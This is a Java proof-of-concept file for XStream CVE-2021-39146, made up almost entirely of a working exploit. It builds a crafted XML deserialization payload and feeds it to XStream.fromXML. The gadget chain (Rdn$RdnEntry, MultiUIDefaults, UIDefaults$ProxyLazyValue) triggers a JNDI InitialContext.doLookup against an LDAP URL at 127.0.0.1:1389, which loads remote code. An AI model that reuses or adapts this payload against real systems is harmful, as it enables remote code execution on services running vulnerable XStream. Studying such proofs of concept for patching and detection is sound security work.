package com.r17a.xstream.cve.sortedset;

import com.thoughtworks.xstream.XStream;

public class CVE_2021_39146 {
    public static void main(String[] args) {
        String xml = "<sorted-set>\n" +
                "  <javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "    <type>test</type>\n" +
                "    <value class='javax.swing.MultiUIDefaults' serialization='custom'>\n" +
                "      <unserializable-parents/>\n" +
                "      <hashtable>\n" +
                "          <default>\n" +
                "            <loadFactor>0.75</loadFactor>\n" +
                "            <threshold>525</threshold>\n" +
                "          </default>\n" +
                "          <int>700</int>\n" +
                "          <int>0</int>\n" +
                "      </hashtable>\n" +
                "      <javax.swing.UIDefaults>\n" +
                "          <default>\n" +
                "            <defaultLocale>zh_CN</defaultLocale>\n" +
                "            <resourceCache/>\n" +
                "          </default>\n" +
                "      </javax.swing.UIDefaults>\n" +
                "      <javax.swing.MultiUIDefaults>\n" +
                "          <default>\n" +
                "            <tables>\n" +
                "            <javax.swing.UIDefaults serialization='custom'>\n" +
                "              <unserializable-parents/>\n" +
                "              <hashtable>\n" +
                "                <default>\n" +
                "                  <loadFactor>0.75</loadFactor>\n" +
                "                  <threshold>525</threshold>\n" +
                "                </default>\n" +
                "                <int>700</int>\n" +
                "                <int>1</int>\n" +
                "                <string>lazyValue</string>\n" +
                "                <javax.swing.UIDefaults_-ProxyLazyValue>\n" +
                "                  <className>javax.naming.InitialContext</className>\n" +
                "                  <methodName>doLookup</methodName>\n" +
                "                  <args>\n" +
                "                    <string>ldap://127.0.0.1:1389/#test</string>\n" +
                "                  </args>\n" +
                "                </javax.swing.UIDefaults_-ProxyLazyValue>\n" +
                "              </hashtable>\n" +
                "              <javax.swing.UIDefaults>\n" +
                "                <default>\n" +
                "                  <defaultLocale reference='../../../../../../../javax.swing.UIDefaults/default/defaultLocale'/>\n" +
                "                  <resourceCache/>\n" +
                "                </default>\n" +
                "              </javax.swing.UIDefaults>\n" +
                "            </javax.swing.UIDefaults>\n" +
                "            </tables>\n" +
                "          </default>\n" +
                "      </javax.swing.MultiUIDefaults>\n" +
                "    </value>\n" +
                "  </javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "  <javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "    <type>test</type>\n" +
                "    <value class='com.sun.org.apache.xpath.internal.objects.XString'>\n" +
                "      <m__obj class='string'>test</m__obj>\n" +
                "    </value>\n" +
                "  </javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "</sorted-set>";
        XStream xstream = new XStream();
        xstream.fromXML(xml);
    }
}
